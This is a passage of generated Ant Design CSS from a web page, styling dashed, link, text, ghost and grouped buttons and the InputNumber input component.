    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-disabled {
      cursor: not-allowed;
      border-color: #d9d9d9;
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed:not(:disabled):not(.ant-btn-disabled):hover {
      color: #4096ff;
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed:not(:disabled):not(.ant-btn-disabled):active {
      color: #0958d9;
      border-color: #0958d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-background-ghost {
      color: #ffffff;
      background-color: transparent;
      border-color: #ffffff;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):hover {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):active {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-background-ghost:disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous {
      color: #ff4d4f;
      border-color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):hover {
      color: #ff7875;
      border-color: #ffa39e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):active {
      color: #d9363e;
      border-color: #d9363e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous.ant-btn-background-ghost {
      color: #ff4d4f;
      background-color: transparent;
      border-color: #ff4d4f;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):hover {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):active {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous.ant-btn-background-ghost:disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed.ant-btn-dangerous.ant-btn-disabled {
      cursor: not-allowed;
      border-color: #d9d9d9;
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link {
      color: #1677ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link:not(:disabled):not(.ant-btn-disabled):hover {
      color: #69b1ff;
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link:not(:disabled):not(.ant-btn-disabled):active {
      color: #0958d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link.ant-btn-disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link.ant-btn-dangerous {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):hover {
      color: #ff7875;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):active {
      color: #d9363e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link.ant-btn-dangerous:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-link.ant-btn-dangerous.ant-btn-disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text:not(:disabled):not(.ant-btn-disabled):hover {
      color: rgba(0, 0, 0, 0.88);
      background-color: rgba(0, 0, 0, 0.06);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text:not(:disabled):not(.ant-btn-disabled):active {
      color: rgba(0, 0, 0, 0.88);
      background-color: rgba(0, 0, 0, 0.15);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text.ant-btn-disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text.ant-btn-dangerous {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text.ant-btn-dangerous:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text.ant-btn-dangerous.ant-btn-disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):hover {
      color: #ff7875;
      background-color: #fff2f0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-text.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):active {
      color: #ff7875;
      background-color: #fff2f0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-ghost.ant-btn-background-ghost {
      color: #ffffff;
      background-color: transparent;
      border-color: #ffffff;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-ghost.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):hover {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-ghost.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):active {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-ghost.ant-btn-background-ghost:disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group {
      position: relative;
      display: inline-flex;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn:not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:last-child)>.ant-btn,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn:not(:last-child)>.ant-btn {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:first-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn:not(:first-child) {
      margin-inline-start: -1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:first-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn:not(:first-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:first-child)>.ant-btn,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn:not(:first-child)>.ant-btn {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group .ant-btn {
      position: relative;
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group .ant-btn:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group .ant-btn:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group .ant-btn:active {
      z-index: 2;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group .ant-btn[disabled] {
      z-index: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group .ant-btn-icon-only {
      font-size: 14px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:last-child):not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn-primary:not(:last-child):not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:last-child)>.ant-btn-primary:not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn-primary:not(:last-child)>.ant-btn-primary:not(:disabled) {
      border-inline-end-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:first-child):not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn-primary:not(:first-child):not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:first-child)>.ant-btn-primary:not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn-primary:not(:first-child)>.ant-btn-primary:not(:disabled) {
      border-inline-start-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:last-child):not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn-danger:not(:last-child):not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:last-child)>.ant-btn-danger:not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn-danger:not(:last-child)>.ant-btn-danger:not(:disabled) {
      border-inline-end-color: #ff7875;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:first-child):not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn-danger:not(:first-child):not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>span:not(:first-child)>.ant-btn-danger:not(:disabled),
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-group>.ant-btn-danger:not(:first-child)>.ant-btn-danger:not(:disabled) {
      border-inline-start-color: #ff7875;
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="1jjgy91" data-token-hash="icxjto" data-cache-path="icxjto|InputNumber-InputNumber|ant-input-number|anticon">
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"] {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      font-size: 14px;
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"] [class^="ant-input-number"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"] [class^="ant-input-number"],
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"] [class*=" ant-input-number"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"] [class*=" ant-input-number"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"] [class^="ant-input-number"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"] [class^="ant-input-number"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"] [class*=" ant-input-number"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"] [class*=" ant-input-number"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"] [class^="ant-input-number"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"] [class^="ant-input-number"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input-number"] [class*=" ant-input-number"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input-number"] [class*=" ant-input-number"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      position: relative;
      display: inline-block;
      width: 90px;
      min-width: 0;
      background-color: #ffffff;
      background-image: none;
      border-width: 1px;
      border-style: solid;
      border-color: #d9d9d9;
      border-radius: 6px;
      transition: all 0.2s;
      border: 1px solid #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number::-moz-placeholder {
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number::placeholder {
      color: rgba(0, 0, 0, 0.25);
      user-select: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number:placeholder-shown {
      text-overflow: ellipsis;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number:hover {
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-focused {
      border-color: #4096ff;
      box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number[disabled] {
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      border-color: #d9d9d9;
      box-shadow: none;
      cursor: not-allowed;
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-disabled:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number[disabled]:hover {
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-borderless,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-borderless:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-borderless:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-borderless-focused,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-borderless-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-borderless[disabled] {
      background-color: transparent;
      border: none;
      box-shadow: none;
    }

    textarea:where(.css-dev-only-do-not-override-pr0fja).ant-input-number {
      max-width: 100%;
      height: auto;
      min-height: 32px;
      line-height: 1.5714285714285714;
      vertical-align: bottom;
      transition: all 0.3s, height 0s;
      resize: vertical;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-lg {
      padding: 0;
      font-size: 16px;
      border-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-lg input.ant-input-number-input {
      height: 38px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-sm {
      padding: 0;
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-sm input.ant-input-number-input {
      height: 22px;
      padding: 0 7px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-rtl .ant-input-number-input {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-textarea-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-error:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number {
      border-color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-error:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number:hover {
      border-color: #ffa39e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-error:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-error:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number-focused {
      border-color: #ff4d4f;
      box-shadow: 0 0 0 2px rgba(255, 38, 5, 0.06);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-error:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number .ant-input-number-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-error:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number .ant-input-number-suffix {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-warning:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number {
      border-color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-warning:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number:hover {
      border-color: #ffd666;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-warning:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-warning:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number-focused {
      border-color: #faad14;
      box-shadow: 0 0 0 2px rgba(255, 215, 5, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-warning:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number .ant-input-number-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-status-warning:not(.ant-input-number-disabled):not(.ant-input-number-borderless).ant-input-number .ant-input-number-suffix {
      color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-focused {
      border-color: #4096ff;
      box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-out-of-range .ant-input-number-input-wrap input {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      position: relative;
      display: table;
      width: 100%;
      border-collapse: separate;
      border-spacing: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group[class*='col-'] {
      padding-inline-end: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group[class*='col-']:last-child {
      padding-inline-end: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-lg .ant-input-number,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-lg>.ant-input-number-group-addon {
      padding: 7px 11px;
      font-size: 16px;
      line-height: 1.5;
      border-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-sm .ant-input-number,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-sm>.ant-input-number-group-addon {
      padding: 0px 7px;
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-lg .ant-select-single .ant-select-selector {
      height: 40px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-sm .ant-select-single .ant-select-selector {
      height: 24px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group>.ant-input-number {
      display: table-cell;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group>.ant-input-number:not(:first-child):not(:last-child) {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-wrap {
      display: table-cell;
      width: 1px;
      white-space: nowrap;
      vertical-align: middle;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon:not(:first-child):not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-wrap:not(:first-child):not(:last-child) {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-wrap>* {
      display: block !important;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon {
      position: relative;
      padding: 0 11px;
      color: rgba(0, 0, 0, 0.88);
      font-weight: normal;
      font-size: 14px;
      text-align: center;
      background-color: rgba(0, 0, 0, 0.02);
      border: 1px solid #d9d9d9;
      border-radius: 6px;
      transition: all 0.3s;
      line-height: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon .ant-select {
      margin: -5px -11px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon .ant-select.ant-select-single:not(.ant-select-customize-input):not(.ant-pagination-size-changer) .ant-select-selector {
      background-color: inherit;
      border: 1px solid transparent;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon .ant-select-open .ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon .ant-select-focused .ant-select-selector {
      color: #1677ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon .ant-cascader-picker {
      margin: -9px -11px;
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon .ant-cascader-picker .ant-cascader-input {
      text-align: start;
      border: 0;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon:first-child {
      border-inline-end: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon:last-child {
      border-inline-start: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number {
      width: 100%;
      margin-bottom: 0;
      text-align: inherit;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number:focus {
      z-index: 1;
      border-inline-end-width: 1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number:hover {
      z-index: 1;
      border-inline-end-width: 1px;
    }

    .ant-input-number-search-with-button :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number:hover {
      z-index: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group>.ant-input-number:first-child,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon:first-child {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group>.ant-input-number:first-child .ant-select .ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon:first-child .ant-select .ant-select-selector {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group>.ant-input-number-affix-wrapper:not(:first-child) .ant-input-number {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group>.ant-input-number-affix-wrapper:not(:last-child) .ant-input-number {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group>.ant-input-number:last-child,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon:last-child {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group>.ant-input-number:last-child .ant-select .ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-group-addon:last-child .ant-select .ant-select-selector {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-affix-wrapper:not(:last-child) {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    .ant-input-number-search :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-affix-wrapper:not(:last-child) {
      border-start-start-radius: 6px;
      border-end-start-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-affix-wrapper:not(:first-child),
    .ant-input-number-search :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group .ant-input-number-affix-wrapper:not(:first-child) {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact {
      display: block;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact::before {
      display: table;
      content: "";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact::after {
      display: table;
      clear: both;
      content: "";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-addon:not(:first-child):not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-wrap:not(:first-child):not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-input-number:not(:first-child):not(:last-child) {
      border-inline-end-width: 1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-addon:not(:first-child):not(:last-child):hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-wrap:not(:first-child):not(:last-child):hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-input-number:not(:first-child):not(:last-child):hover {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-addon:not(:first-child):not(:last-child):focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-wrap:not(:first-child):not(:last-child):focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-input-number:not(:first-child):not(:last-child):focus {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>* {
      display: inline-block;
      float: none;
      vertical-align: top;
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-input-number-affix-wrapper,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-input-number-number-affix-wrapper,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-picker-range {
      display: inline-flex;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>*:not(:last-child) {
      margin-inline-end: -1px;
      border-inline-end-width: 1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number {
      float: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select>.ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select-auto-complete .ant-input-number,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-cascader-picker .ant-input-number,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-input-number-group-wrapper .ant-input-number {
      border-inline-end-width: 1px;
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select>.ant-select-selector:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select-auto-complete .ant-input-number:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-cascader-picker .ant-input-number:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-input-number-group-wrapper .ant-input-number:hover {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select>.ant-select-selector:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select-auto-complete .ant-input-number:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-cascader-picker .ant-input-number:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-input-number-group-wrapper .ant-input-number:focus {
      z-index: 1;
    }

